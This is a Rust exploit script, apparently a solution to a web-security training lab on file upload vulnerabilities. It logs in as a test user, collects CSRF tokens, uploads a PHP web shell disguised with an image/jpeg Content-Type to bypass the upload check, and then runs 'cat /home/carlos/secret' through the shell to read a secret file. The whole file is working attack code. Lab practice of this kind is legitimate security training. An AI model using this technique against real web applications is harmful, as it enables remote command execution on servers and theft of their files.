use file_upload_vulnerabilities::{
    HTTP_CLIENT, LOGIN_CSRF_TOKEN_SELECTOR, MY_AVATAR_UPLOAD_CSRF_TOKEN_SELECTOR, PASSWORD,
    USERNAME, WEBSHELL, generate_clap_parser, get_csrf_token, get_flag,
};
use reqwest::blocking::{
    Response,
    multipart::{Form, Part},
};
use std::time::{Duration, Instant};

fn main() {
    let start_time: Instant = Instant::now();

    let args = generate_clap_parser();
    let lab_url = args.lab_url.as_str().trim_end_matches("/");

    // Making a get request to the given URL
    let response: Response = HTTP_CLIENT
        .get(format!("{}/login", lab_url))
        .send()
        .expect("[-] Failed to make GET request");

    // Extracting the body from the response
    let body: String = response.text().expect("[-] Failed to read response text");

    // Getting the CSRF token for /login page
    let login_page_csrf_token = get_csrf_token(&body, &LOGIN_CSRF_TOKEN_SELECTOR);
    println!("[+] Login CSRF Token: {}", login_page_csrf_token);

    // Generating the login form data
    let data = [
        ("username", USERNAME),
        ("password", PASSWORD),
        ("csrf", &login_page_csrf_token),
    ];

    // Logging in as the given user. This request responds with the /my-account?id=wiener page
    let response = HTTP_CLIENT
        .post(format!("{}/login", lab_url))
        .form(&data)
        .send()
        .expect("[-] Failed to login as the given user");

    // Extracting the body from the response
    let body = response.text().expect("[-] Failed to read response text");

    // Getting the CSRF token from the /my-account?id=wiener page for the uploading avatar
    let my_avatar_upload_csrf_token = get_csrf_token(&body, &MY_AVATAR_UPLOAD_CSRF_TOKEN_SELECTOR);

    println!(
        "[+] My Avatar Upload CSRF Token: {}",
        &my_avatar_upload_csrf_token
    );

    // Generating the web shell payload to upload
    let payload: Part = Part::bytes(WEBSHELL.as_bytes())
        .file_name("web-shell.php")
        // Bypassing Content-Type restriction
        .mime_str("image/jpeg")
        .expect("[-] Failed to generate payload");

    // Generating avatar upload multipart form data
    let form: Form = Form::new()
        .text("user", USERNAME)
        .text("csrf", my_avatar_upload_csrf_token)
        .part("avatar", payload);

    // Uploading the Payload
    let response = HTTP_CLIENT
        .post(format!("{}/my-account/avatar", lab_url))
        .multipart(form)
        .send()
        .expect("[-] Failed to upload payload");

    // If payload upload successful
    if response.status() == 200 {
        // Trying to read the secret
        let response: Response = HTTP_CLIENT
            .get(format!(
                "{}/files/avatars/web-shell.php?command=cat /home/carlos/secret",
                lab_url
            ))
            .send()
            .expect("[-] Failed to get secret");

        if response.status() == 200 {
            get_flag(response.text().expect("[-] Failed to read secret"));
        }
    }

    let total_time: Duration = Instant::elapsed(&start_time);
    println!("[+] Total time taken: {}", total_time.as_secs_f64());
}
